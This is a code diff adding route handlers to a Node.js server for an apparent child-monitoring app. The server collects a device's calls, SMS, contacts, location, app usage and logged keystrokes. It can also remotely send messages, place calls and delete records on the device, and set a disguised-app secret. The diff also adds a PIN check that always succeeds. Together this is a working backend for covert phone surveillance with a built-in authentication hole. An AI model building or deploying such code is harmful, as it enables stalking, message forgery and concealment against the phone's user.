@@ -557,4 +557,632 @@ async function handler(req, res) {
       const deviceId = String(body.deviceId || body.childId || '');
       const type = String(body.type || body.command || '');
       if (!deviceId || !type) return send(res, 400, { ok: false, error: 'deviceId + type required' });
-      const dev = db.devices.
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      const cmd = addCommand(db, dev.id, type, body.payload || body.data || body);
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id, command: cmd });
+    }
+
+    if (pathname === '/commands/pending' && method === 'GET') {
+      reclaimCommands(db);
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const did = String(ch.id || ch.deviceId);
+      // newest first, claim atomically
+      const pending = db.commands
+        .filter(c => String(c.deviceId) === did && c.status === 'PENDING')
+        .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0))
+        .slice(0, 30);
+      const out = [];
+      for (const c of pending) {
+        if (c.status !== 'PENDING') continue;
+        c.status = 'CLAIMED';
+        c.claimedAt = nowMs();
+        out.push({
+          id: c.id,
+          type: c.type || c.command,
+          command: c.type || c.command,
+          payload: c.payload || {},
+          createdAt: c.createdAt
+        });
+      }
+      if (out.length) save(db);
+      else save(db); // persist online
+      return send(res, 200, { ok: true, commands: out });
+    }
+
+    if (pathname === '/commands/ack' && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const id = String(body.id || body.commandId || '');
+      const c = db.commands.find(x => String(x.id) === id);
+      if (c) {
+        c.status = 'DONE';
+        c.doneAt = nowMs();
+        save(db);
+      }
+      return send(res, 200, { ok: true });
+    }
+
+    // ---- CALLS ----
+    if ((pathname === '/calls' || pathname === '/calls/log' || pathname === '/call-log') && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || q.childId || '');
+      let list = db.calls.filter(c => {
+        if (deviceId && String(c.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
+        return dev && dev.parentId === p.id;
+      });
+      list = list.filter(c => !c.deletedBy).sort((a, b) => Number(b.startedMs || b.ts || 0) - Number(a.startedMs || a.ts || 0));
+      return send(res, 200, { ok: true, calls: list.slice(0, 500) });
+    }
+
+    if ((pathname === '/calls' || pathname === '/calls/sync' || pathname === '/call-log') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const did = String(ch.id || ch.deviceId);
+      const rows = Array.isArray(body.calls) ? body.calls : (Array.isArray(body.items) ? body.items : [body]);
+      for (const r of rows) {
+        if (!r || typeof r !== 'object') continue;
+        r.deviceId = did;
+        upsertCall(db, r);
+      }
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if ((pathname === '/calls/place' || pathname === '/call/place') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const number = String(body.number || body.phone || '').trim();
+      if (!deviceId || !number) return send(res, 400, { ok: false, error: 'deviceId + number required' });
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      // dedupe PENDING same number 12s
+      const t = nowMs();
+      const exists = db.commands.find(c =>
+        String(c.deviceId) === String(dev.id) &&
+        (c.type === 'place_call' || c.command === 'place_call') &&
+        (c.status === 'PENDING' || c.status === 'CLAIMED') &&
+        String((c.payload && c.payload.number) || '') === number &&
+        (t - Number(c.createdAt || 0)) < 12000
+      );
+      if (exists) return send(res, 200, { ok: true, id: exists.id, deduped: true });
+      const cmd = addCommand(db, dev.id, 'place_call', { number });
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if ((pathname === '/calls/end' || pathname === '/call/end' || pathname === '/calls/hangup') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      const cmd = addCommand(db, dev.id, 'end_call', {});
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if ((pathname === '/calls/delete' || pathname === '/call/delete') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const id = String(body.id || body.callId || '');
+      const androidId = String(body.androidId || '');
+      const c = db.calls.find(x => String(x.id) === id || (androidId && String(x.androidId) === androidId));
+      if (c) {
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
+        if (dev && dev.parentId === p.id) {
+          c.deletedBy = 'parent';
+          if (androidId || c.androidId) {
+            addCommand(db, dev.id, 'delete_call', { androidId: c.androidId || androidId });
+          }
+          save(db);
+        }
+      }
+      return send(res, 200, { ok: true });
+    }
+
+    // ---- SMS ----
+    if (pathname === '/sms' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || q.childId || '');
+      let list = db.sms.filter(s => {
+        if (deviceId && String(s.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(s.deviceId));
+        return dev && dev.parentId === p.id;
+      });
+      list = list.filter(s => !s.deletedBy).sort((a, b) => Number(b.date || b.ts || 0) - Number(a.date || a.ts || 0));
+      return send(res, 200, { ok: true, sms: list.slice(0, 800) });
+    }
+
+    if ((pathname === '/sms' || pathname === '/sms/sync') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const did = String(ch.id || ch.deviceId);
+      const rows = Array.isArray(body.sms) ? body.sms : (Array.isArray(body.items) ? body.items : [body]);
+      for (const r of rows) {
+        if (!r || typeof r !== 'object') continue;
+        r.deviceId = did;
+        upsertSms(db, r);
+      }
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/sms/send' && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const number = String(body.number || body.address || body.phone || '').trim();
+      const text = String(body.body || body.message || body.text || '');
+      if (!deviceId || !number) return send(res, 400, { ok: false, error: 'deviceId + number required' });
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      const cmd = addCommand(db, dev.id, 'send_sms', { number, body: text, message: text });
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if (pathname === '/sms/delete' && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const id = String(body.id || body.smsId || '');
+      const androidId = String(body.androidId || '');
+      const s = db.sms.find(x => String(x.id) === id || (androidId && String(x.androidId) === androidId));
+      if (s) {
+        const dev = db.devices.find(d => String(d.id) === String(s.deviceId));
+        if (dev && dev.parentId === p.id) {
+          s.deletedBy = 'parent';
+          if (s.androidId) addCommand(db, dev.id, 'delete_sms', { androidId: s.androidId });
+          save(db);
+        }
+      }
+      return send(res, 200, { ok: true });
+    }
+
+    // ---- LOCATION ----
+    if (pathname === '/location' && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const lat = Number(body.lat || body.latitude);
+      const lng = Number(body.lng || body.longitude || body.lon);
+      if (!isFinite(lat) || !isFinite(lng)) return send(res, 400, { ok: false, error: 'lat/lng required' });
+      const row = {
+        id: rid(),
+        deviceId: String(ch.id || ch.deviceId),
+        lat, lng,
+        accuracy: Number(body.accuracy || 0),
+        ts: nowMs(),
+        at: now()
+      };
+      db.locations.push(row);
+      ch.lastLocation = { lat, lng, ts: row.ts };
+      if (db.locations.length > 20000) db.locations = db.locations.slice(-15000);
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if ((pathname === '/location' || pathname === '/location/history') && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || q.childId || '');
+      const since = nowMs() - 7 * 24 * 3600 * 1000;
+      let list = db.locations.filter(l => {
+        if (Number(l.ts || 0) < since) return false;
+        if (deviceId && String(l.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(l.deviceId));
+        return dev && dev.parentId === p.id;
+      });
+      list.sort((a, b) => Number(b.ts || 0) - Number(a.ts || 0));
+      return send(res, 200, { ok: true, locations: list.slice(0, 2000), location: list[0] || null });
+    }
+
+    // ---- PROTECTION / SECURITY settings ----
+    if ((pathname === '/child/security' || pathname === '/child/settings' || pathname === '/settings') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      const ch = childOf(body, q, req.headers);
+      if (p) {
+        const deviceId = String(body.deviceId || body.childId || '');
+        const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+        if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+        const payload = {
+          wizard_secret: body.wizard_secret || body.calculator_secret || body.secret,
+          access_code: body.access_code || body.admin_password || body.password,
+          app_info_password: body.app_info_password || body.appInfoPassword,
+          remove_access_code: !!body.remove_access_code
+        };
+        const cmd = addCommand(db, dev.id, 'set_security', payload);
+        save(db);
+        return send(res, 200, { ok: true, id: cmd.id });
+      }
+      if (ch) {
+        markOnline(ch);
+        return send(res, 200, { ok: true });
+      }
+      return send(res, 401, { ok: false, error: 'unauthorized' });
+    }
+
+    // ---- TAMPER / protection events ----
+    if ((pathname === '/events/tamper' || pathname === '/events/alert' || pathname === '/alerts') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (ch) {
+        markOnline(ch);
+        db.alerts.push({
+          id: rid(),
+          deviceId: String(ch.id || ch.deviceId),
+          type: body.type || 'tamper',
+          message: body.message || body.text || 'alert',
+          ts: nowMs()
+        });
+        if (db.alerts.length > 1000) db.alerts = db.alerts.slice(-800);
+        save(db);
+      }
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/alerts' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const list = db.alerts.filter(a => {
+        const dev = db.devices.find(d => String(d.id) === String(a.deviceId));
+        return dev && dev.parentId === p.id;
+      }).sort((a, b) => Number(b.ts || 0) - Number(a.ts || 0));
+      return send(res, 200, { ok: true, alerts: list.slice(0, 100) });
+    }
+
+    // ---- Soft stubs (old Core may call) — no crash ----
+    if ((pathname === '/device/rename' || pathname === '/devices/rename') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const name = String(body.name || body.childName || '').trim().slice(0, 40);
+      if (!deviceId || name.length < 1) return send(res, 400, { ok: false, error: 'deviceId + name required' });
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      dev.name = name;
+      save(db);
+      return send(res, 200, { ok: true, deviceId: dev.id, name: dev.name });
+    }
+
+    if ((pathname === '/device/remove' || pathname === '/devices/remove' || pathname === '/device/unlink') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      if (!deviceId) return send(res, 400, { ok: false, error: 'deviceId required' });
+      const before = db.devices.length;
+      db.devices = db.devices.filter(d => {
+        if (d.parentId !== p.id) return true;
+        const id = String(d.id || '');
+        const did = String(d.deviceId || '');
+        return id !== deviceId && did !== deviceId;
+      });
+      // drop pending commands for removed device
+      db.commands = db.commands.filter(c => String(c.deviceId) !== deviceId);
+      save(db);
+      return send(res, 200, { ok: true, removed: before - db.devices.length });
+    }
+
+
+    if ((pathname === '/family/code/refresh' || pathname === '/family/refresh-code') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      p.familyCode = familyCode();
+      save(db);
+      return send(res, 200, { ok: true, familyCode: p.familyCode });
+    }
+
+
+    // ---- KEYLOGGER (from Full_Clean backend) ----
+    if (pathname === '/keystrokes/log' && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      if (!db.keystrokes) db.keystrokes = [];
+      const deviceId = String(ch.id || ch.deviceId);
+      const pushOne = (pkg, text, ts) => {
+        if (!text || !String(text).trim()) return;
+        let createdAt = now();
+        let createdMs = nowMs();
+        try {
+          if (typeof ts === 'number') {
+            createdMs = (ts > 1e11) ? ts : nowMs();
+            createdAt = new Date(createdMs).toISOString();
+          } else if (ts) {
+            const p = Date.parse(String(ts));
+            if (!isNaN(p) && p > 1e11) { createdMs = p; createdAt = new Date(p).toISOString(); }
+          }
+        } catch (e) {}
+        db.keystrokes.push({
+          id: rid(),
+          deviceId,
+          packageName: pkg || '',
+          text: String(text).slice(0, 4000),
+          createdAt,
+          createdMs
+        });
+      };
+      if (Array.isArray(body.items)) {
+        body.items.forEach(k => {
+          if (!k) return;
+          pushOne(k.packageName, k.text, k.createdMs || k.createdAt || k.ts);
+        });
+      } else if (body.text) {
+        String(body.text).split(/\n/).forEach(line => {
+          const parts = line.split('\t');
+          if (parts.length >= 3) {
+            const ms = Number(parts[0]) || nowMs();
+            pushOne(parts[1], parts.slice(2).join('\t'), ms);
+          } else if (line.trim()) pushOne(body.packageName || '', line.trim(), nowMs());
+        });
+      } else if (body.packageName) {
+        pushOne(body.packageName, body.text || '', nowMs());
+      }
+      const cut = nowMs() - 15 * 24 * 60 * 60 * 1000;
+      db.keystrokes = db.keystrokes.filter(k => {
+        const ms = k.createdMs || Date.parse(String(k.createdAt || '')) || 0;
+        return !ms || ms >= cut;
+      });
+      if (db.keystrokes.length > 50000) db.keystrokes = db.keystrokes.slice(-50000);
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/keystrokes' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || q.childId || '');
+      if (!db.keystrokes) db.keystrokes = [];
+      let list = db.keystrokes.filter(k => {
+        if (deviceId && String(k.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(k.deviceId) || String(d.deviceId) === String(k.deviceId));
+        return dev && dev.parentId === p.id;
+      });
+      list = list.slice().sort((a, b) => {
+        const am = a.createdMs || Date.parse(String(a.createdAt || '')) || 0;
+        const bm = b.createdMs || Date.parse(String(b.createdAt || '')) || 0;
+        return bm - am;
+      }).slice(0, 8000);
+      return send(res, 200, { ok: true, keystrokes: list });
+    }
+
+
+
+    // ---- compatibility: paths Core/Parent still call ----
+    if (pathname === '/location/update' && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const lat = Number(body.lat != null ? body.lat : body.latitude);
+      const lng = Number(body.lng != null ? body.lng : (body.longitude != null ? body.longitude : body.lon));
+      if (isFinite(lat) && isFinite(lng)) {
+        db.locations.push({ id: rid(), deviceId: String(ch.id), lat, lng, accuracy: Number(body.accuracy || 0), ts: nowMs(), at: now() });
+        ch.lastLocation = { lat, lng, ts: nowMs() };
+        if (db.locations.length > 20000) db.locations = db.locations.slice(-15000);
+        save(db);
+      }
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/device/offline' && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (ch) { ch.online = false; ch.lastSeen = now(); save(db); }
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/pair/create' && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      if (!p.familyCode) { p.familyCode = familyCode(); save(db); }
+      return send(res, 200, { ok: true, familyCode: p.familyCode, code: p.familyCode, pairingCode: p.familyCode });
+    }
+
+    if ((pathname === '/security/set' || pathname === '/settings/device') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      const payload = {
+        wizard_secret: body.wizard_secret || body.calculator_secret || body.secret,
+        access_code: body.access_code || body.admin_password || body.password,
+        app_info_password: body.app_info_password || body.appInfoPassword,
+        remove_access_code: !!body.remove_access_code
+      };
+      const cmd = addCommand(db, dev.id, 'set_security', payload);
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if (pathname === '/rules/set' && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || body.childId || '');
+      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
+      if (!db.settings[dev.id]) db.settings[dev.id] = {};
+      const rules = body.rules || body.rule || body;
+      db.settings[dev.id].rules = rules;
+      const cmd = addCommand(db, dev.id, 'rules_set', { rules });
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if ((pathname === '/apps/index' || pathname === '/apps') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const items = Array.isArray(body.apps) ? body.apps : (Array.isArray(body.items) ? body.items : []);
+      ch.apps = items.slice(0, 800);
+      ch.appsAt = nowMs();
+      save(db);
+      return send(res, 200, { ok: true, count: ch.apps.length });
+    }
+
+    if (pathname === '/apps' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || q.childId || '');
+      const dev = db.devices.find(d => (String(d.id) === deviceId || String(d.deviceId) === deviceId) && d.parentId === p.id);
+      const apps = (dev && dev.apps) ? dev.apps : [];
+      return send(res, 200, { ok: true, apps, total: apps.length });
+    }
+
+    if ((pathname === '/contacts/sync' || pathname === '/contacts') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const items = Array.isArray(body.contacts) ? body.contacts : (Array.isArray(body.items) ? body.items : []);
+      const did = String(ch.id);
+      if (body.replace === true || body.full === true) {
+        db.contacts = db.contacts.filter(c => String(c.deviceId) !== did);
+      }
+      for (const c of items) {
+        if (!c) continue;
+        const num = String(c.number || c.phone || '');
+        const name = String(c.name || '');
+        let found = db.contacts.find(x => String(x.deviceId) === did && String(x.number || '') === num && String(x.name || '') === name);
+        if (!found) db.contacts.push({ id: rid(), deviceId: did, name, number: num, createdAt: now() });
+      }
+      if (db.contacts.length > 20000) db.contacts = db.contacts.slice(-15000);
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/contacts' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || '');
+      const list = db.contacts.filter(c => {
+        if (deviceId && String(c.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
+        return dev && dev.parentId === p.id;
+      });
+      return send(res, 200, { ok: true, contacts: list.slice(0, 3000) });
+    }
+
+    if ((pathname === '/contacts/add' || pathname === '/contacts/delete' || pathname === '/contacts/rename') && method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(body.deviceId || '');
+      const dev = db.devices.find(d => (String(d.id) === deviceId || String(d.deviceId) === deviceId) && d.parentId === p.id);
+      if (!dev) return send(res, 404, { ok: false, error: 'device not found' });
+      const type = pathname.split('/').pop();
+      const cmd = addCommand(db, dev.id, 'contact_' + type, body);
+      save(db);
+      return send(res, 200, { ok: true, id: cmd.id });
+    }
+
+    if ((pathname === '/usage/sync' || pathname === '/usage') && method === 'POST') {
+      const ch = childOf(body, q, req.headers);
+      if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
+      markOnline(ch);
+      const items = Array.isArray(body.usage) ? body.usage : (Array.isArray(body.items) ? body.items : [body]);
+      for (const u of items) {
+        if (!u || typeof u !== 'object') continue;
+        db.usage.push({ id: rid(), deviceId: String(ch.id), pkg: u.packageName || u.pkg || '', seconds: Number(u.seconds || u.foregroundSeconds || 0), day: u.day || '', ts: nowMs() });
+      }
+      if (db.usage.length > 20000) db.usage = db.usage.slice(-15000);
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/usage' && method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
+      const deviceId = String(q.deviceId || '');
+      const list = db.usage.filter(u => {
+        if (deviceId && String(u.deviceId) !== deviceId) return false;
+        const dev = db.devices.find(d => String(d.id) === String(u.deviceId));
+        return dev && dev.parentId === p.id;
+      }).slice(-500);
+      return send(res, 200, { ok: true, usage: list });
+    }
+
+    if (pathname === '/privacy/pending' || pathname === '/privacy/active') {
+      return send(res, 200, { ok: true, pending: [], active: null });
+    }
+    if (pathname.startsWith('/privacy/')) {
+      return send(res, 200, { ok: true });
+    }
+
+    if (pathname === '/updates/check') {
+      return send(res, 200, { ok: true, update: false });
+    }
+    if (pathname === '/parent/pin/status') {
+      return send(res, 200, { ok: true, set: false });
+    }
+    if (pathname === '/parent/pin/verify') {
+      return send(res, 200, { ok: true, valid: true });
+    }
+
+
+    if (pathname.startsWith('/media') || pathname.startsWith('/live') || pathname.startsWith('/gallery') ||
+        pathname.startsWith('/files') || pathname.startsWith('/webrtc') || pathname.startsWith('/record')) {
+      return send(res, 200, { ok: true, items: [], media: [], skipped: true, mode: 'slim' });
+    }
+
+    // Unknown child/parent poll: acknowledge so the app does not crash the loop.
+    if (method === 'GET' || method === 'POST') {
+      return send(res, 200, { ok: true, items: [], skipped: true, path: pathname });
+    }
+    return send(res, 404, { ok: false, error: 'not found', path: pathname });
+  } catch (e) {
+    console.error('handler', e);
+    try { send(res, 500, { ok: false, error: String(e.message || e) }); } catch (e2) {}
+  }
+}
+
+const server = http.createServer((req, res) => {
+  try {
+    handler(req, res).catch(e => {
+      console.error('handler async', e && e.stack ? e.stack : e);
+      try {
+        if (!res.headersSent) send(res, 500, { ok: false, error: 'server error' });
+        else res.end();
+      } catch (e2) {}
+    });
+  } catch (e) {
+    console.error('handler sync', e && e.stack ? e.stack : e);
+    try {
+      if (!res.headersSent) send(res, 500, { ok: false, error: 'server error' });
+      else res.end();
+    } catch (e2) {}
+  }
+});
+
+server.requestTimeout = 120000;
+server.headersTimeout = 120000;
+server.keepAliveTimeout = 65000;
+server.timeout = 120000;
+
+server.on('error', (e) => {
+  console.error('server error event', e && e.message);
+});
+
+server.listen(PORT, HOST, () => {
+  try { load(); } catch (e) { console.error('load on start', e && e.message); }
+  console.log('[slim-backend] listening on', HOST + ':' + PORT, 'phase 302');
+});
+
+// Never exit on stray errors — Railway restarts on exit; keep process alive.
+process.on('uncaughtException', (e) => {
+  console.error('uncaught', e && e.stack ? e.stack : e);
+});
+process.on('unhandledRejection', (e) => {
+  console.error('unhandled', e && (e.stack || e));
+});
+process.on('SIGTERM', () => {
+  console.log('SIGTERM — closing');
+  try { server.close(() => process.exit(0)); } catch (e) { process.exit(0); }
+  setTimeout(() => process.exit(0), 8000).unref();
+});
+process.on('SIGINT', () => process.exit(0));
